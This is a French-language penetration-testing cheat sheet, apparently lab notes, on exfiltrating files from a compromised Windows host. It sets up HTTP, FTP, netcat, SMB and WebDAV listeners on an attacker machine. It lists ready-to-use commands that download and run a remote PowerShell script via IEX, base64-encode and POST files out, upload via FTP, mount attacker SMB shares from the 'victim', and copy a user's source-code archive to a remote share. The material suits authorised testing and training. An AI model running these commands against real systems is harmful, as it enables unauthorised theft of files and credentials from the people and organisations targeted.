---
public: true # set to true to make the article publishable
---
## Listener HTTP
```title=configuration du serveur 
pip3 install uploadserver
python3 -m uploadserver
```

### PsUpload.ps1

```utilisation depuis powershell
PS> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### Base 64

```
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

## Listener FTP

```
sudo python3 -m pyftpdlib --port 21 --write
```

### Powershell

```
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Client ftp
On pourra également utiliser simplement le client `ftp`
## Listener NC

```
# lancement du listener
nc -lvnp 8000

# décodate de la payload reçue 
echo <base64> | base64 -d -w 0 > fichier
```

### Encodage Base 64 du fichier

```title=Linux
echo <base64> | base64 -d -w 0 > fichier
```

```title=Powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

## SMB

### SMB Classique
```
attacker> sudo smbserver.py myshare ./ -smb2support
attacker> sudo smbserver.py myshare ./ -smb2support -user rebrec -password blah
victim> net use x: \\<ATACKER_IP>\myshare /user rebrec blah
```

### WebDav

#### Listener WebDAV

```
# installation
sudo pip install wsgidav cheroot

# utilisation
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

#### Connection au partage

```
# Si on veut accéder à la racine utiliser le partage spécial DavWWWRoot
dir \\192.168.49.128\DavWWWRoot 

# Sinon utilisation du nom du partage classique
dir \\192.168.49.128\partage
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\partage\


```